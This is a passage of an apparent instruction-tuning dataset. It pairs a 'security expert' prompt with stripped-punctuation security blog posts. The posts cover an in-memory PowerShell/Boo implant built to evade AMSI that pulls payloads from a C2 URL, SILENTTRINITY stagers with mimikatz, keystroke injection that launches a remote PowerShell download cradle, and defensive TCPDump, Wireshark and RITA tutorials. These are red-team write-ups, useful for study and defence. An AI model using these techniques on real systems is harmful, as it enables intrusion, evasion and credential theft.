Jscript Engine within a Posh script and then executes some Jscript code that also calls .NET APIs Building a PoC BYOI PowerShell Implant While traditional PowerShell tradecraft is considered mostly dead because of AMSI and Script Logging we can use BYOI to breathe some new life back into it Additionally using PowerShell as the host .NET language highlights some of the main benefits of BYOI tradecraft in terms of evasion and OpSec Let's set the scene you have some post-exploitation code you want to execute on an endpoint and you just want to use PowerShell 'cause you're very nostalgic The endpoint is running the latest Windows 10 build and has Defender with AMSI and Script Block logging enabled You set up a lab environment with the same defenses and controls in place in order to test your payload before actually executing it on the target endpoint We're going to use the AMSI Test Sample String to simulate malicious code that we want to execute This string is guaranteed to trigger Defender AMSI meaning if this doesn't pop an alert we know we successfully bypassed them thanks to rastamouse for putting this on Github ist.github.com rasta-mouse 5cdf25b7d3daca5536773fdf998f2f08 We're going to execute our malicious code through a Boolang compiler embedded within our PowerShell script First thing we do is grab the Invoke-Boolang.ps1 script from the OffensiveDLR repository We're going to use this code as a template to build off of ist.github.com byt3bl33d3r 7a3068441dab6184b4d3df46d71998a2 Let's break down what's going on here Lines 4 8 12 and 16 have 4 variables that contain the Compressed and Base64 encoded strings of Boo.Lang.dll Boo.Lang.Compiler.dll Boo.Lang.Parser.dll and Boo.Lang.Extensions.dll respectively These are the four main .NET Assemblies that the Boolang Compiler needs in order to spin up Line 20-26 contains the Load-Assembly function which decompresses and decodes a given Base64 encoded and compressed Assembly and puts it into a byte array We then call Assembly.Load on the latter to reflectively load that Assembly into memory Lines 28-31 actually calls the Load-Assembly function and assigns the loaded Assemblies into their respective variables Lines 57-62 contain the actual Boolang Source Code we want to execute and assigns it to a variable We're gonna replace this with our malicious code later on On line 64 we create a StringInput object and give it our Boolang Source code This is just a way to tell the Boolang Compiler we want to compile source code from a string and not from a file on disk somewhere We also give the source code a fake file name this is important as the name we set here will be used in the generated Assemblies Type name which we'll need to reflectively call to actually execute our payload On line 67 we create a CompilerParameters object and pass false to the constructor which gets rid of a bunch of bugs that Boolang has when embedded into PowerShell See the comments in the script for details What follows on line 69-72 is the magic sauce we add the ScriptInput object we defined earlier to the CompilerParamaters we then specify we want the CompileToMemory pipeline As you can imagine this tells Boolang to compile the code completely in memory and not spool it to disk which is one of the main tradecraft benefits of BYOI We also tell the compiler to allow Duck Typing which makes writing Boolang code a lot more similar to Python On lines 75-81 we manually tell the compiler to add mscorlib System System.Core as references to our Boolang code as we're going to need them to access basic .NET APIs You obviously could add more references here if you wanted to access more .NET namespaces from within your Boo code We also add the 4 Boolang Assemblies as references Technically you don't have to add the Boolang DLLs as references in order for the compiler to successfully compile Boolang code However if you wanted to do some compiler inception or access any of the Boo Toolchain from within your Boo code you're gonna need those Assemblies Additionally the Boo.Lang.Extension.dll provides some syntactic sugar such as context managers which makes things a lot nicer to look at On line 85 we pass our CompilerParameters object to the BooCompiler After finally compiling our code on line 88 by calling compiler.Run we check if there's a generated Assembly which indicates compilation was successful We then call GetType to retrieve our entry class Our entry class is going to be called MyScriptModule because we did not define a class in our Boo Source code so it'll automatically create one for us by using the fake file name we passed to the StringInput object earlier on line 64 It'll take everything before the .boo extension and append Module to it Hence our class name will be called MyScriptModule We then call GetMethod to retrieve our Main Boo function and execute it using Invoke We can now dynamically compile execute Boo code from Powershell Ok so how do we go about executing our malicious code without triggering Defender AMSI Well a na\u00efve approach would be to just plop our AMSI test string within our Boolang Source This is not going to work and will trigger Defender because we're using PowerShell as the host language whenever a PowerShell script gets executed it'll be passed to AMSI AMSI is going to see our Boo Source code since it's in the PowerShellscript and flag on it What we need to do is separate our payload Boo source from the initial execution vector our PowerShellscript If we were using another language as the host say C this may not be necessary So how do we go about separating things out We could put the Boo code in a separate file on disk but that would be cheating We're going to have to write some C2 To keep things simple we're going to use HTTP as the communication channel ist.github.com byt3bl33d3r 1da9d0725a5f1bb8502fce5eda8faa42 We added a while loop with some inner error handling which will use the Invoke-WebRequest CmdLet to download Boo Source from the URL 72.16.164.1 source.boo every 5 seconds I'll leave it as an exercise to the reader on how to potentially make this Powershell v2 compatible and return the output of our Boo payload to the C2 server Let's host our source.boo file which will contain our payload server side using Python's built-in HTTP Server and then run it again You can see this time our AMSI Test string successfully gets by Defender We're now back to the good old days of throwing source code around instead of compiled binaries Additionally PowerShell logging has no insight into the Boolang code we execute once the code gets compiled we're transitioning to another .NET language which PowerShell logging has no insight into Finally the setup overhead required is much less than doing this with traditional C tradecraft at least in my opinion Detection Detection of BYOI tradecraft is difficult and comes down to a number of factors first and foremost being the host language used When using PowerShell as the host language there are far more detection opportunities because of the number of defensive technologies and logging in place When using any other language present by default on Windows that can interact with .NET e.g C VBA etc detection opportunities diminish significantly While AMSI has been introduced in .NET 4.8 which is a step in the right direction it doesn't really pose much of an obstacle for BYOI payloads due to their dynamic nature Because of this as of this writing there really aren't any straightforward robust detection mechanisms that organizations can implement on endpoints servers We can however raise the bar for an attacker using this type of tradecraft in order to slow them down by combining several fragile detections mechanisms together and adopting a defense in-depth approach AMSI signatures for the default compiled assemblies of all third-party .NET scripting languages e.g Boolang IronPython SSharp etc this would have to be done by Microsoft Detecting the use of .NET Scripting Language assemblies loaded within a managed processes AppDomain this can be accomplished with technologies like ETW Application whitelisting to disable the use of .NET scripting languages present by default on Windows and the executables which allow users to interface with them Enabling all the standard mitigations that would prevent traditional PowerShell tradecraft Script Block Logging Constrained Language Mode etc The first one of these in particular would start tackling the root of the issue AMSI signatures for the third party scripting language runtimes are just a band-aid an attacker could obfuscate re-compile the assemblies to evade signature detection or even make their own custom scripting language hint Personally I think it would be best if Microsoft added some sort of security control within .NET to enable and disable the ability to load embed scripting languages because this ability undermines a lot of the progress they've made in recent years I'm not exactly sure if that's even possible and this ability is a key feature of the .NET platform Key Takeaways Like with every kind of tradecraft there are some pros and cons By far the biggest issue with this concept is that you cannot take advantage of all the C tooling that's been released You could just call Assembly.Load within the embedded language to run the tool you want to execute however that could trigger AMSI on .NET 4.8 think SharpSploit you would have to re-implement the tool in the embedded scripting language in order to create an effective bypass When It comes to Boolang this is somewhat alleviated by the fact that SharpDevelop 4.4 has C to Boo translator You can literally just paste in C code and it will translate it to Boolang This is an insane timesaver using this I managed to port GhostPack's Seatbelt to Boo and added it as a post-ex module to SILENTTRINITY in around 20-30 min as supposed to weeks the codebase is around 6926 lines of code It would be very interesting to see if it would be possible to create a headless version of the translator and improve upon it As demonstrated above BYOI offers an incredible amount of flexibility allows us to give new life to some tradecraft which is considered not opsec safe or outdated by the Red Teaming community and shifts the paradigm back to using dynamic scripting languages in our post-exploitation payloads For more examples of BYOI payloads using different combinations of embedded and host languages I highly encourage you to check out the Offensive DLR repository Additionally SILENTTRINITY is another tool that I wrote which attempts to weaponize some of these concepts and wrap them in a fully-featured C2 tool"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>My First Joyride With SILENTTRINITY</title>\n<taxonomies>Author, How-To, Informational, Jordan Drysdale, Red Team, Jordan Drysdale, SILENTTRINITY</taxonomies>\n<creation_date>Wed, 05 Feb 2020 13:09:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Jordan Drysdale TL DR SILENTTRINITY ST made the news a few times in July 2019 and I wanted to see what all the fuss was about This article has enough information to get ST installed the teamserver operational and a client connected to the teamserver Once all that is out of the way we'll go for the goods Pre-Req's for Following Along Digital Ocean 10 mo Ubuntu 19.10 Node Windows box es for pillaging Permissions to perform said pillaging Install Each time there seem to be some issues with at least one install directive But at this point my stable install looks something like the following git clone ithub.com byt3bl33d3r SILENTTRINITY apt update apt upgrade apt install python3.7 python3.7-dev python3-pip sudo -H pip3 install -U pipenv cd SILENTTRINITY pip3 install -r requirements.txt pipenv install pipenv shell The Article I Wrote About SILENTTRINITY Our story begins with a standard user on a Windows domain who we are going to assume clicked a link or executed an HTA This user has appropriate non-admin privileges and as such limits our ability to easily escalate privileges From there the story provides some basic usage and hopefully expands the reader's and my own knowledge Assuming the install went well let's get the server up and running For opsec we'd do things like ensure the server was running on a categorized domain name we'd also limit access to the listening services via firewall restrictions and we also need to be aware that Listeners can be dangerous and may contain vulnerabilities python st.py teamserver --port 81 10.10.98.228 BadPassword123 Once executed we should get back the certificate fingerprint and a confirmation that the server is running Next we need to get the client side connected A couple of ways we can go about this In red team ops the server would be running on some cloud service or VPS and we'd connect to it from behind our own proxies VPNs firewalls whathaveyou In this case I'm just going to open another tmux pane and connect to the server locally There's a lot going on in the next screenshot It includes the pwd opt SILENTTRINITY and the preparation of a virtual environment so as not to tamper with all the other python related dependencies on the local system The commands used above and the additional client connection to the Teamserver are below pwd pipenv install pipenv shell python st.py client wss aptclass BadPassword123 10.10.98.228 81 Once connected the splash screen From here we need to fire up a Listener listeners use https The listener's options menu for HTTPS The stagers powershell options configuration and my favorite context-based tab completion implementation ever can be seen below stagers options But really I just want the fastest way to malware which was stagers powershell generate https ...and stagers msbuild generate https The stager.ps1 file was dropped into my opt SILENTTRINITY directory and was basically ready for execution The python -m http.server works great to stand up a quick and browsable web server I also generated a stager.xml for MSBuild which is quieter and has fewer optics focused in its general direction though that is changing too python -m http.server Then from the client we snag the stager files ...and...execute them Full disclosure PowerShell got flagged The stager.xml file also got flagged But the msbuild.xml was built with the following command Msbuild.exe stager.xml And we get our session Here like the Twilight Zone I control the SIEM sysmon deployment the horizontal and the vertical and thus I don't care if I catch myself In fact I hope to Which with Sysmon is exceptionally easy We next find the sysmon event IDs by filtering our endpoint sysmon logs in Kibana for event_id 3 As seen below we have the likely popped host the process and the destination IP address But we might as well keep exploring right Egypt always told me he'd start any meterpreter session by validating running processes and process integrity because these things matter If we can't read all the process details we aren't admin and asking can be an IoC Let's jump into the modules section and run ps modules use boo ps run It's already game over for this system We have a privileged shell Let's do it use boo mimikatz run Cheers all and thanks for reading Links ST ithub.com byt3bl33d3r SILENTTRINITY ZDNet ww.zdnet.com article croatian-government-targeted-by-mysterious-hackers SCMag ww.scmagazineuk.com entirely-new-malware-silenttrinity-attacks-croatian-government article 1590225 Teamserver security ithub.com byt3bl33d3r SILENTTRINITY wiki Teamserver-Security-Considerations-Guidelines"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Getting Started With TCPDump</title>\n<taxonomies>Author, How-To, Informational, InfoSec 101, John Strand, john strand, TCPDump</taxonomies>\n<creation_date>Mon, 24 Feb 2020 13:07:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "outu.be hC3ANnUXn_o Hello and welcome my name is John Strand and in this video we're going to be talking about getting started with TCPDump Now TCPDump is a fantastic tool it's one of the core essential tools that every single IT professional should have especially Infosec professionals The reason why is TCPDump gives us the ability to actually see inside the network traffic that's coming and going from our computer system and if we're on a span port on a switch or a mirrored port on a switch or if we're on a wireless network that broadcasts everything we can see all the traffic on that particular interface as well But the key is first starting out by identifying which interface you're going to look at Inside of TCPDump you can run tcpdump -D This will actually list out all of the available interfaces that TCPDump has to be able to sniff on Now it's generally just good practice 99.99 of the situations to identify the interface you're going to sniff on And in this situation on my handy-dandy security onion system you can see that there are multiple interfaces that are running Specifically though we're going to be looking at the ethernet interface and this one's named ens33 Now if you're familiar with some older versions of Linux they used to call everything eth0 eth1 and so on They changed that recently we can get into that a little bit later in a video But the name of my ethernet interface on my security onion system is ens33 I'm also going to be looking at the local loopback adapter a little bit later So let's dive in and actually start some sniffing So I can do TCPDump and then I can actually specify my interface and in this situation I provide ens33 your ethernet interface will most likely be different and I'm also going to add a couple of additional switches I'm going to add -XA The reason why I'm putting in the X and the A is because with those two switches combined it's going to show me the hexadecimal output and it's going to show me the ASCII code of that hex X is for Hex A is for ASCII Why is that important Let me show you So we're going to run TCPDump specify the interface is ens33 on my computer system yours will be different and I do -XA Now as soon as I run that it pops up and it says you do not have permission to actually start sniffing The reason for this is TCPDump requires Superuser permissions On a Linux or Unix based system you need to be root Or on a Windows computer system if you're running the Windows equivalent called WinDump you need me to running as administrator because we're going to be running very very low-level permissions to be able to sniff the traffic on a computer Now to get around this error if you ever get it all you need to do is put a sudo in front of it If you've seen the xkcd comic sudo make me a sandwich This is going to switch users and then do the command tcpdump It's going to ask me for my password I put in my password hit enter and then TCPDump should be running if I type my password correctly which I did not There we go now it's running So with this I now want to start sending traffic that TCPDump can see So I'm going to start by pinging 8.8.8.8 and that's going to be Google's DNS server And as soon as I hit enter Huzzah You can see the packets being sent and the responses coming back from Google Now what's interesting about this is I am doing a standard ping of Google sending an icmp echo request to Google and you can see that Google is responding What's interesting is if you look at what's being sent you can see I'm sending to Google could you please send back 0 1 2 3 4 5 6 7 and then the reply down here you can see the request and then the reply is 0 1 2 3 4 5 6 7 Ok so it's not all that interesting alright I get it so now let's change this up just a hair okay So now what we're going to do is I'm going to specify a different adapter I'm going to specify my local loopback adapter And I'm going to actually send some data back and forth So whenever I start up TCPDump I'm going to fire up Netcat because I'm old people I'm going to run Netcat listening on port 2222 Then I'm going to connect we're going to send data through that So there I have my Netcat listener and then on the other side I'm going to do Netcat 127.0.0.1 and then we're going to go 2222 and then hit enter And I type HELLOOOOOOOOOOOO lots of O's it's important Hit enter and it shows up on the other side What did I just do Well I created a little port listener on Port 2222 and then I connected and I sent through the data HELLOOOOOOOOOOOO and if we look you can actually see inside of that packet which is unencrypted You can see that TCPDump was able to actually see that raw data That's pretty cool Now there's some other really neat options that you can run with TCPDump One of the things you can do with TCPDump is you can actually read in the contents of a file So in this situation I'm reading in a pcap file but we're going to spend some more time looking into that actually has command and control backdoor data in it So we're going to use taidoor we're going to look at the traffic no interactions just a straight pcap it's a really small pcap we're going to read in that capture file we're going to see the hex decode and the ASCII decode and specifically we want to look at all the data coming and going from a host In this situation the compromised host is 10.0.2.15 and the port is 80 So whenever I hit enter it's going to read that data from that capture file and you can see the HTTP requests being sent back and forth Up here a little bit further you're actually able to see the encoded data with the backdoor being sent We'll talk more about encoding and decoding a little bit later but this kind of helps you get started with TCPDump One other quick note whenever you're running with TCPDump you can run TCPDump and then you can also write out the data to a file So I'm going to specify my ethernet interface but now I'm going to do the -W and I'm going to give it a file ihateclowns2.pcap There we go And now what it's going to do is well if I'm root I'm going to hit sudo hit enter and now it's sniffing on our interface and it's writing all the data to a file This can then be shared with other Professionals for troubleshooting and offline analysis One of the other great features of TCPDump is it is very fast very lightweight and very efficient at capturing and writing out large packet capture files I hope you had a good time in this video and I hope to see you in the other videos in the very near future"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Getting Started With Wireshark</title>\n<taxonomies>Author, How-To, Informational, InfoSec 101, John Strand, john strand, Wireshark</taxonomies>\n<creation_date>Wed, 26 Feb 2020 13:11:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "outu.be KYnbfYCkiOc Hello and welcome my name is John Strand and in this video we're going to be getting started with Wireshark Now Wireshark is very similar to TCPDump in fact a lot of people actually prefer Wireshark to TCPDump but I look at them as two completely different utilities TCPDump is fantastic for creating scripts going through and doing large packet captures on systems and Wireshark is a lot better at doing analysis of systems using a full GUI interface So let's get started We're using the security onion again because the security onion is fantastic for anything with network forensics Once again thanks to Doug Burks and crew So let's dive right in So we can go into applications and we can go to internet and we can select Wireshark Once we're in Wireshark Wireshark has the ability to list out all of the interfaces on the system This is once again very similar to what we saw with the TCPDump video with the -D I can choose any of the interfaces and it'll pop up and it'll say hey you need to be running this as root So what I'm going to do is do sudo wireshark and it's going to ask me for my password So alright when we first get into Wireshark you're going to be able to see all of your interfaces So down here if I can zoom in you can see that we have ens33 sending some traffic So I can double click that and it's automatically going to start sniffing on that particular interface There's not a lot going on however if I actually start up another terminal I can send a ping once again to 8.8.8.8 and then whenever we go back to Wireshark you can actually see those ICMP echo requests going through So pretty snifty to actually be able to see your traffic once again Another thing with Wireshark is if you actually select any of these packets it's going to break down the actual hexadecimal decode here or the hacks and if you highlight over certain sections and click on the sections within the hacks it's going to decode what that is in the middle window So let's go ahead and zoom in on that just a little bit So if you select this section it says that this is the individual address unicast you can see this is the A and Mac addresses this is in VMware If I get down to the bottom this is the actual payload of what's being sent And with an ICMP echo request and reply on most Linux systems it's going to send an ICMP echo request with a payload of 0 1 2 3 4 5 6 7 So that's pretty neat Now let's actually go through and open up a file I'm going to stop my sniff by clicking the little stop button and I'm going to go file open recent and I'm going to open up the actual pcap backdoor I'm going to continue without saving Now this is actually a packet capture from a compromised computer system and this will give me the ability to dig in a little bit on some of the cool things that I can do with Wireshark So if I can take any one of these packets right a packet doesn't necessarily exist in most communications it's just an individual thing Some protocols like UDP and ICMP are very very much nonstateful However with most TCP protocols they're stateful So I'm going to send a packet to a system and it's going to respond This is going to be a conversation I can right-click on any one of these different packets and I can actually go through and apply filters I can apply a conversation filter or I can look at the individual streams themselves What I'm going to do is I going to do follow TCP strength and this is going to give me the actual communication between these two systems and it's going to display it in such a way that it's easy for me to understand what's going on Now this is clear text HTTP if it's encrypted you're going to see the encrypted data But you can see that what was being sent between these two systems in this HTTP request was a get request with our actual command and control data for a backdoor and then an HTTP okay response came back Now whenever I applied that you can see that each of the streams has number values and in this situation Wireshark said I want you to look at just the stream equal 0 I can clear that out by hitting the little x right here The next thing I can do is I can look at some really cool statistics in a packet capture I can do statistics and then I can look at all of the endpoints that are communicating in this particular packet capture This allows me if I'm doing threat hunting or doing troubleshooting to make sure that the IP address that I'm looking for is actually in this communication capture file that I have here as well Other things I can do is I can look at statistics and I can actually look at the conversations how much data is being sent in between these different IP addresses So what's the address A what's the port that's being used and who is that system actually talking to How many packets are being sent and how much data is being sent as well This will allow you to focus in on your top talkers on the network Finally you can look at statistics and you can go through and look at protocol hierarchy as well So protocol hierarchy will actually breakdown the actual protocols that are being used in this particular packet capture itself And in this situation you can see that we have ethernet we have IPV4 we have some net bios traffic but we also have some TCP and some HTTP traffic as well Now the reason why you would do this honestly is because if you're trying to break down a packet capture and you're trying to understand what a system or a series of systems is doing it really helps to kind of step back and say okay who's talking with whom and then drill down to the specific IP address or IP addresses that you're looking forward to talking to as well Finally you can do statistics and you can actually look at the HTTP conversations as well and this will actually show you the HTTP requests that are being sent into the computers So this is just a quick overview of Wireshark once again it isn't meant to be exhaustive but this is definitely a start for people that have never used Wireshark Once again we're using the security onion because we absolutely love that distribution and everything that they do because all these tools are built-in and yes you can get Wireshark for Mac and for Windows as well I can't wait to see you in the next video"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Detecting Malware Beacons With Zeek and RITA</title>\n<taxonomies>Author, How-To, Informational, InfoSec 101, John Strand, john strand, RITA, Zeek</taxonomies>\n<creation_date>Tue, 03 Mar 2020 13:10:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "outu.be eETUi-AZYgc Hello and welcome my name is John Strand and in this video we're going to be talking a little bit about beaconing using RITA Now for this particular video I'm not using the security onion instead we're going to be using ADHD If you want to find ADHD go to the ActiveCountermeasures.com website Go to our projects you'll see RITA and Passer and a bunch of tools there and one of the tools is the Active Defense Harbinger Distribution and that's what I'm going to be using today Now the reason why are we using ADHD is a couple of reasons One we have step by step instructions on how to use ADHD for this particular video and we have a pcap that's already been imported so we could talk about beaconing so you can actually follow along Once you're inside of ADHD the first thing that you're going to be doing is jumping into attribution Go all the way down to RITA Now RITA stands for Real Intelligence Threat Analytics If you're looking at what RITA is compared to AI Hunter our commercial tool RITA is basically all of the logic all of the math all of the horsepower all for free Active Countermeasure's AI Hunter or Actual Intelligence Hunter is actually the GUI platform notifications all of the stuff you'd expect to see in an enterprise environment Now within Rita we're going to follow these basic instructions and in fact I already have run this To actually get RITA to work you just cd into home ADHD tools and go into the enterprise lab Then normally what you would do with a bro logs setup is you would go into bro and you would then load in that data let bro parse it and then you would use RITA You would do RITA import and you would give it the path to the bro logs and then a destination database and then it will parse everything Then you do RITA analyze and then it does its analytics and it's ready to go You don't have to do that inside of ADHD it's already been done for you Also in this particular video I've already got the Mongo database started and I have the HTML report generated So I'm going to show you what that looks like This is the HTML output It has a number of different output features it can do text it can do JSON connect directly into Mongo I'm looking at the HTML because it lends itself better to videos like this one So if we jump into VSagent this is actually a packet capture for a specific time frame that has been imported by bro Then RITA has analyzed it and we have a number of things we're going to look at I'll talk about these in separate videos The first one I'm going to talk about is beacons We'll talk a little bit about what it means to be a beacon for these things Here you can see that we have a source IP address of 10.234.234.100 and a destination IP address of 138.197.117.74 You can also see that there was 4 532 connections Now about those connections what exactly does it mean to be a beacon Whenever you're looking at it from a mathematics perspective you can use a number of algorithms such as K-means Clustering to basically do some basic analysis as far as what is consistent about these connections We actually don't use K-means Clustering K-means is something that's available in Splunk it's a fantastic utility but it's all about finding the right algorithms for the right problem In this scenario RITA uses MADMOM median average distribution of the mean What exactly does that mean Whenever you're looking for a beacon let's get some philosophy here for a second Here we have a chair How do you know that that's a chair Now this goes back to the earlier days of philosophy when you're talking about Plato and I know this sounds weird trust me it's technical stick with me Plato basically said that everything that we have in the world is basically an imitation or a shadow of a true form So somewhere in the universe was a perfect chair and every other chair was just a variation on that chair Well it turns out in computer science whenever you're doing things like K-means Clustering using artificial intelligence and machine learning you're doing something very similar What you're doing is saying these are the characteristics of a perfect chair Or in this situation a perfect beacon If we were going to say what a perfect beacon was what are all the things we would say to make it perfect Well interval Interval is like a heartbeat Some heart beats are slow and some heart beats are much faster If there's a consistency in these different connections then you have a consistent heartbeat That may be one aspect of a beacon Another thing you can look at can be data size If all the packets are the exact same size as what's being sent and what's being received that can be a sign of that beaconing activity of saying Is there a command No Is there a command No Is there a command No Is there a command No And we can look for those consistencies in those packets We can even look for inconsistencies to find consistencies Let me explain Whenever you're looking for inconsistencies to find consistencies you may have jitter or dispersion in your packet connections So what that would mean is let's imagine that we have a 10-second interval with 20 jitter on either side That means that all of your packets would be between a range of 8 seconds and 12 seconds 2 seconds on either side of 10 seconds and you would see a distribution where that would be 50 from 10 to 12 and 50 from 8 to 10 We can actually look for that as well RITA does all of this and it does it fairly quickly and it does it for free across every single connection in a packet capture That's RITA when we're talking about beacons So ideally what you would do is you would sort this you can export it to an Excel spreadsheet if you'd like and you look at the score Now there are a bunch of different systems that have high scores in here but a couple of things that are interesting First you're going to see a lot of Google and Microsoft data within these connections This particular system is a DigitalOcean IP address Basic research can tell us one of these is not like the other The other thing is the shear number of connections A lot of these other ones you have a small number of connections going to known good IP addresses In our evil backdoor we have a high number of connections that is running at a very consistent interval Now does this mean that every single thing that beacons at a high interval connection is evil No but it does mean that you want to look into it It means it's not human behavior and yes RITA does have the capability of actually importing a whitelist and then filtering those things out Once again that's why we do AI Hunter So that is our little video talking about beaconing I hope you enjoyed it and I hope you get a chance to play with RITA in the Active Defense Harbinger Distribution Now once again once you get into the Active Defense Harbinger Distribution the user ID and password is ADHD and ADHD you'll go to attribution you will drop down and you're going to see RITA Once you open up and follow the instructions you open up a packet capture then select beacons and below the beacon data for that packet capture"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Executing Keyboard Injection Attacks</title>\n<taxonomies>Author, Hardware Hacking, How-To, Informational, Ray Felch, Raymond Felch</taxonomies>\n<creation_date>Wed, 04 Mar 2020 13:11:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Ray Felch Preface Following the work of the Bastille Research Group See ithub.com BastilleResearch mousejack I was interested in knowing if these keyboard injection vulnerabilities were still valid To my surprise I was able to duplicate the attack on an inexpensive Logitech keyboard that I already had in my possession This keyboard Logitech K400r is still available at my local Walmart for under 20 In particular wireless devices using the Unifying receiver depicted with the orange star are particularly vulnerable From my initial research it appears that communication keystrokes from the wireless keyboard is encrypted to prevent eavesdropping and that mouse movements are usually sent unencrypted The MouseJack exploit takes advantage of vulnerable dongles by allowing unencrypted keystrokes to be passed to the target computer's operating system as legitimate packets This wireless non-Bluetooth attack scenario can be accomplished with a fairly inexpensive radio dongle a tiny script and from a distance of up to 100 meters away I have outlined my process below Hardware Crazy Radio PA dongle Keyboard Logitech K400r FCC ID JNZYR0019 Fortunately for this project the FCC information pertaining to this device is not really all that necessary however it is good to know that it is intended to operate wirelessly within the 2.405 2.474GHz WiFi range Keyboard Injection Payload In preparation for our intended attack we need to create a short text file based on the Rubber Ducky scripting language for more info ithub.com hak5darren USB-Rubber-Ducky wiki Using any text editor nano vi notepad etc enter the following and save the file DELAY 500 GUI r DELAY 500 STRING notepad.exe ENTER DELAY 1000 STRING Hello World Example using nano text editor GUI r simulates holding the Windows key and clicking 'r to open the Run Window STRING notepad.exe obviously types notepad.exe in the Run Window opening Notepad STRING Hello World gets typed into the newly open Notepad page Note Although some delays may be required to ensure reliable operation when using the Rubber Ducky USB dongle such is not the case when implementing our attack using the CrazyRadio dongle This is because we aren't loading any USB drivers or trying to detect any USB dongle being plugged into the USB port The delays in this case are for demonstration purposes Ideally we would want to execute our script and inject our payload as quickly as possible to avoid human detection but also not at the risk reliable operation Download JackIt git clone ithub.com insecurityofthings jackit.git cd jackit pip install -e Run JackIt with payload script 'hello.txt Once target is identified CTRL-C and select Target Key s to inject payload NOTE Knowing the MAC address is not required to pull off this attack All that is required is the target KEY and that the TYPE has a valid entry Logitech HID Microsoft HID etc an empty field or 'unknown will not work SUCCESS Cloud Based PowerShell Injection Realizing that keyboard payload injection was now possible my next step was to attempt injecting a PowerShell payload using this proven attack method First I created a github repository to host my PowerShell injection script Next I modified my 'hello.txt script to run PowerShell instead of notepad and I changed the injection string from Hello World to a PowerShell Invoke Expression IEX cmdlet that downloads a .ps1 script and executes it on the target computer Running JackIt with the modified 'hello.txt script now produced the desired results I was clearly able to inject cloud based PowerShell execution using known vulnerabilities in a Logitech HID Summary I'm glad that I started with the vulnerable keyboard as none of the mice in my possession could be injected even though they're clearly Logitech Unify receivers and had the orange star markings I suspect this might be due to the fact that Logitech implements dongle firmware that can be updated where as many of the mice already in the field use one-time programmable flash devices Microsoft has issued a security update upport.microsoft.com en-us help 3152550 microsoft-security-advisory-update-to-improve-wireless-mouse-input-fil that checks to see if the communicated payload coming from the dongle is QWERTY and if the device TYPE is of a mouse then the packet will be ignored However from what I can determine this security update is basically optional Based on this information I have decided to order a few Microsoft mice and test these devices to continue my research Regardless I suspect that there are hundreds of thousands of vulnerable keyboards and mice in the wild and this often overlooked attack vector is one that needs to be taken seriously Most users might think oh it's just a keyboard it's just a mouse what harm can they cause The fact is a keystroke injection that simply displays Hello World could have just as easily been a PowerShell injection that executes Metasploit downloads Malware or a virus exfiltrates sensitive data elevates privileges gains persistence etc Possible mitigation could consist of using bluetooth or wired devices rather than wireless or removing the dongles when not in use or getting firmware and security updates in a timely manner when they are available Obviously these options can take away from the overall 'user experience so most or all of them may not be implemented at all"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Detecting Long Connections With Zeek/Bro and RITA</title>\n<taxonomies>Author, How-To, Informational, InfoSec 101, John Strand, bro, RITA, Zeek</taxonomies>\n<creation_date>Wed, 18 Mar 2020 21:01:38 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
